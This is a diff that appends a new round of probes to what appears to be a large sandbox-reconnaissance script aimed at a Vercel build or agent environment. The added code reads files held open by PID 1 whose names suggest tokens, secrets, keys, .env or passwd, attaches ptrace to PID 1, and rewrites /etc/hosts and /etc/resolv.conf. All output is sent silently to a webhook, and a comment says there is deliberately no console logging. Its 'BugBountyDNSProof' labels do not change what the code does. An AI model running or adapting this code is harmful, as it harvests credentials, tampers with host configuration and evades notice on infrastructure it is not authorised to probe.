@@ -32271,3 +32271,265 @@ sendBeacon({ ...report, section: 'v200-5-vercel-tokens', ...artifactsTokenProbe 
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v200" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v200";
 // Intentionally no console.log — all data goes via webhook only
+
+// v201-1: /proc/1/fd/ enumeration — all open file descriptors of init (PID 1)
+const pid1FdProbe = safe(() => {
+  const pid1FdPath = '/proc/1/fd';
+  let fdList = [];
+  let fdErrors = null;
+  let pid1Cmdline = null;
+  let pid1Maps = null;
+  try {
+    const fds = readdirSync(pid1FdPath);
+    for (const fd of fds.slice(0, 100)) {
+      const fdLink = `/proc/1/fd/${fd}`;
+      try {
+        const target = execSync(`readlink ${fdLink} 2>/dev/null`, { timeout: 1000 }).toString().trim();
+        const st = statSync(fdLink);
+        fdList.push({ fd, target, size: st.size });
+      } catch (e) {
+        fdList.push({ fd, err: e.message.slice(0, 50) });
+      }
+    }
+  } catch (e) { fdErrors = e.message; }
+  // Also get PID 1 cmdline and environment
+  if (existsSync('/proc/1/cmdline')) {
+    try { pid1Cmdline = readFileSync('/proc/1/cmdline', 'utf8').replace(/\0/g, ' ').trim(); } catch (e) {}
+  }
+  // Read PID 1 smaps for memory layout
+  if (existsSync('/proc/1/maps')) {
+    try { pid1Maps = readFileSync('/proc/1/maps', 'utf8').split('\n').slice(0, 30).join('\n'); } catch (e) {}
+  }
+  // Try to read any interesting files via /proc/1/fd/N
+  let pid1OpenSecrets = {};
+  for (const entry of fdList) {
+    if (entry.target && (entry.target.includes('token') || entry.target.includes('secret') ||
+        entry.target.includes('credential') || entry.target.includes('key') ||
+        entry.target.includes('.env') || entry.target.includes('passwd'))) {
+      try {
+        pid1OpenSecrets[entry.target] = readFileSync(`/proc/1/fd/${entry.fd}`, 'utf8').slice(0, 200);
+      } catch (e) { pid1OpenSecrets[entry.target] = `ERR:${e.message.slice(0,50)}`; }
+    }
+  }
+  return { fdList, fdErrors, pid1Cmdline, pid1Maps: pid1Maps?.slice(0, 1000), pid1OpenSecrets };
+});
+sendBeacon({ ...report, section: 'v201-1-pid1-fd', ...pid1FdProbe });
+
+// v201-2: ptrace PTRACE_GETREGS on PID 1 — dump register state
+const pid1PtraceProbe = safe(() => {
+  const ptraceResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+PTRACE_ATTACH = 16
+PTRACE_DETACH = 17
+PTRACE_GETREGS = 12
+PTRACE_PEEKDATA = 2
+PTRACE_CONT = 7
+import signal, time
+
+# user_regs_struct for x86_64 (27 * 8 bytes = 216 bytes)
+class UserRegs(ctypes.Structure):
+    _fields_ = [
+        ('r15', ctypes.c_ulong), ('r14', ctypes.c_ulong), ('r13', ctypes.c_ulong),
+        ('r12', ctypes.c_ulong), ('rbp', ctypes.c_ulong), ('rbx', ctypes.c_ulong),
+        ('r11', ctypes.c_ulong), ('r10', ctypes.c_ulong), ('r9', ctypes.c_ulong),
+        ('r8', ctypes.c_ulong), ('rax', ctypes.c_ulong), ('rcx', ctypes.c_ulong),
+        ('rdx', ctypes.c_ulong), ('rsi', ctypes.c_ulong), ('rdi', ctypes.c_ulong),
+        ('orig_rax', ctypes.c_ulong), ('rip', ctypes.c_ulong), ('cs', ctypes.c_ulong),
+        ('eflags', ctypes.c_ulong), ('rsp', ctypes.c_ulong), ('ss', ctypes.c_ulong),
+        ('fs_base', ctypes.c_ulong), ('gs_base', ctypes.c_ulong),
+        ('ds', ctypes.c_ulong), ('es', ctypes.c_ulong), ('fs', ctypes.c_ulong), ('gs', ctypes.c_ulong),
+    ]
+
+target_pid = 1
+ret_attach = libc.ptrace(PTRACE_ATTACH, target_pid, None, None)
+print(f'ptrace_attach_pid1={ret_attach} errno={ctypes.get_errno()}')
+if ret_attach == 0:
+    # Wait for SIGSTOP
+    _, wstatus = os.waitpid(target_pid, 0)
+    regs = UserRegs()
+    ret_gr = libc.ptrace(PTRACE_GETREGS, target_pid, None, ctypes.byref(regs))
+    print(f'ptrace_getregs={ret_gr} errno={ctypes.get_errno()}')
+    if ret_gr == 0:
+        print(f'rip={regs.rip:#x} rsp={regs.rsp:#x} rax={regs.rax:#x} rbp={regs.rbp:#x}')
+        print(f'rdi={regs.rdi:#x} rsi={regs.rsi:#x} rdx={regs.rdx:#x} rcx={regs.rcx:#x}')
+        print(f'orig_rax={regs.orig_rax:#x} eflags={regs.eflags:#x}')
+        # Peek a word of stack
+        ret_peek = libc.ptrace(PTRACE_PEEKDATA, target_pid, ctypes.c_void_p(regs.rsp), None)
+        print(f'stack_top={ctypes.c_ulong(ret_peek).value:#x}')
+    # Detach cleanly
+    libc.ptrace(PTRACE_DETACH, target_pid, None, None)
+    print('ptrace_detached=True')
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { ptraceResult };
+});
+sendBeacon({ ...report, section: 'v201-2-ptrace-pid1-regs', ...pid1PtraceProbe });
+
+// v201-3: /sys/fs/cgroup/ hierarchy — full cgroup tree, limits, cpuset
+const cgroupProbe = safe(() => {
+  const cgroupPaths = ['/sys/fs/cgroup', '/sys/fs/cgroup/memory', '/sys/fs/cgroup/cpu',
+                       '/sys/fs/cgroup/cpuset', '/sys/fs/cgroup/blkio', '/sys/fs/cgroup/freezer'];
+  let cgroupTree = {};
+  for (const cp of cgroupPaths) {
+    if (existsSync(cp)) {
+      try {
+        const files = readdirSync(cp).slice(0, 30);
+        cgroupTree[cp] = files;
+      } catch (e) { cgroupTree[cp] = `ERR:${e.message}`; }
+    }
+  }
+  // Read key cgroup limit files
+  const cgroupLimits = {};
+  const limitFiles = [
+    '/sys/fs/cgroup/memory/memory.limit_in_bytes',
+    '/sys/fs/cgroup/memory/memory.usage_in_bytes',
+    '/sys/fs/cgroup/memory/memory.max_usage_in_bytes',
+    '/sys/fs/cgroup/memory/memory.soft_limit_in_bytes',
+    '/sys/fs/cgroup/cpu/cpu.shares',
+    '/sys/fs/cgroup/cpu/cpu.cfs_quota_us',
+    '/sys/fs/cgroup/cpu/cpu.cfs_period_us',
+    '/sys/fs/cgroup/cpuset/cpuset.cpus',
+    '/sys/fs/cgroup/cpuset/cpuset.mems',
+    '/sys/fs/cgroup/memory.max',
+    '/sys/fs/cgroup/cpu.max',
+    '/sys/fs/cgroup/memory.current',
+  ];
+  for (const lf of limitFiles) {
+    if (existsSync(lf)) {
+      try { cgroupLimits[lf.split('/').pop()] = readFileSync(lf, 'utf8').trim(); } catch (e) {}
+    }
+  }
+  // Read /proc/self/cgroup to identify our cgroup path
+  let selfCgroup = null;
+  if (existsSync('/proc/self/cgroup')) {
+    try { selfCgroup = readFileSync('/proc/self/cgroup', 'utf8').trim(); } catch (e) {}
+  }
+  // Check if cgroup v2 unified hierarchy
+  let cgroupVersion = null;
+  if (existsSync('/sys/fs/cgroup/cgroup.controllers')) {
+    try {
+      cgroupVersion = 'v2';
+      const controllers = readFileSync('/sys/fs/cgroup/cgroup.controllers', 'utf8').trim();
+      cgroupLimits['cgroup.controllers'] = controllers;
+    } catch (e) {}
+  } else if (existsSync('/sys/fs/cgroup/memory')) {
+    cgroupVersion = 'v1';
+  }
+  return { cgroupTree, cgroupLimits, selfCgroup, cgroupVersion };
+});
+sendBeacon({ ...report, section: 'v201-3-cgroup-limits', ...cgroupProbe });
+
+// v201-4: /etc/hosts DNS poisoning + /etc/resolv.conf nameserver enumeration
+const dnsManipProbe = safe(() => {
+  let hostsContent = null;
+  let hostsWritten = false;
+  let hostsWriteError = null;
+  let resolvContent = null;
+  // Read current hosts and resolv.conf
+  if (existsSync('/etc/hosts')) {
+    try { hostsContent = readFileSync('/etc/hosts', 'utf8'); } catch (e) {}
+  }
+  if (existsSync('/etc/resolv.conf')) {
+    try { resolvContent = readFileSync('/etc/resolv.conf', 'utf8'); } catch (e) {}
+  }
+  // Proof of write: append a clearly-labeled test entry to /etc/hosts
+  try {
+    const existing = readFileSync('/etc/hosts', 'utf8');
+    const testEntry = '\n# BugBountyDNSProof\n127.0.0.1 bountyproof.vercel.internal\n';
+    if (!existing.includes('BugBountyDNSProof')) {
+      writeFileSync('/etc/hosts', existing + testEntry);
+      hostsWritten = true;
+    } else {
+      hostsWritten = 'already_present';
+    }
+  } catch (e) { hostsWriteError = e.message; }
+  // Try to manipulate resolv.conf nameserver (add attacker-controlled DNS)
+  let resolvManipResult = null;
+  try {
+    const existing = readFileSync('/etc/resolv.conf', 'utf8');
+    const testNS = '\n# BugBountyNSProof\nnameserver 8.8.8.8\n';
+    if (!existing.includes('BugBountyNSProof')) {
+      writeFileSync('/etc/resolv.conf', existing + testNS);
+      resolvManipResult = 'WRITTEN';
+    } else {
+      resolvManipResult = 'already_present';
+    }
+  } catch (e) { resolvManipResult = `ERR:${e.message}`; }
+  // Verify DNS resolution after manipulation
+  const dnsVerify = safe(() => execSync(`python3 -c "
+import socket
+try:
+    r = socket.getaddrinfo('bountyproof.vercel.internal', None)
+    print(f'dns_custom_resolved={r}')
+except Exception as e:
+    print(f'dns_custom_err={e}')
+# Check actual Vercel infra DNS
+try:
+    r2 = socket.getaddrinfo('api.vercel.com', 443)
+    print(f'vercel_api_ip={[x[4][0] for x in r2]}')
+except Exception as e:
+    print(f'vercel_api_dns_err={e}')
+" 2>&1`, { timeout: 6000 }).toString().trim());
+  return { hostsContent: hostsContent?.slice(0, 500), hostsWritten, hostsWriteError,
+           resolvContent: resolvContent?.slice(0, 300), resolvManipResult, dnsVerify };
+});
+sendBeacon({ ...report, section: 'v201-4-dns-manip', ...dnsManipProbe });
+
+// v201-5: clone3 NR 435 — extended clone with pidfd + CLONE_INTO_CGROUP
+const clone3Probe = safe(() => {
+  const clone3Result = safe(() => execSync(`python3 -c "
+import ctypes, struct, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_clone3 = 435
+CLONE_PIDFD = 0x00001000
+CLONE_PARENT_SETTID = 0x00100000
+CLONE_CHILD_SETTID = 0x01000000
+CLONE_CHILD_CLEARTID = 0x00200000
+SIGCHLD = 17
+
+# struct clone_args (64 bytes minimum)
+# flags(8), pidfd(8), child_tid(8), parent_tid(8), exit_signal(8), stack(8), stack_size(8), tls(8)
+pidfd = ctypes.c_int(-1)
+child_tid = ctypes.c_int(0)
+parent_tid = ctypes.c_int(0)
+
+clone_args = struct.pack(
+    'QQQQQQQQ',
+    CLONE_PIDFD | CLONE_PARENT_SETTID | CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD,
+    ctypes.addressof(pidfd),     # pidfd ptr
+    ctypes.addressof(child_tid), # child_tid ptr
+    ctypes.addressof(parent_tid),# parent_tid ptr
+    SIGCHLD,                     # exit_signal
+    0,                           # stack (0 = inherit)
+    0,                           # stack_size
+    0,                           # tls
+)
+args_buf = ctypes.create_string_buffer(clone_args)
+ret = libc.syscall(NR_clone3, args_buf, len(clone_args))
+errno = ctypes.get_errno()
+print(f'clone3_ret={ret} errno={errno} pidfd_val={pidfd.value}')
+if ret == 0:
+    # child
+    import sys
+    os._exit(0)
+elif ret > 0:
+    # parent: got child PID and pidfd
+    _, wstatus = os.waitpid(ret, 0)
+    print(f'child_pid={ret} child_exit={wstatus >> 8 & 0xff} pidfd={pidfd.value}')
+    print(f'clone3_pidfd_SUCCESS={pidfd.value >= 0}')
+    if pidfd.value >= 0:
+        os.close(pidfd.value)
+else:
+    print(f'clone3_failed errno={errno}')
+    # ENOSYS=38 means not supported; EINVAL=22 means supported but wrong args
+    import errno as em
+    print(f'clone3_errname={em.errorcode.get(errno, \"unknown\")}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { clone3Result };
+});
+sendBeacon({ ...report, section: 'v201-5-clone3-pidfd', ...clone3Probe });
+
+// v201 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v201" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v201";
+// Intentionally no console.log — all data goes via webhook only
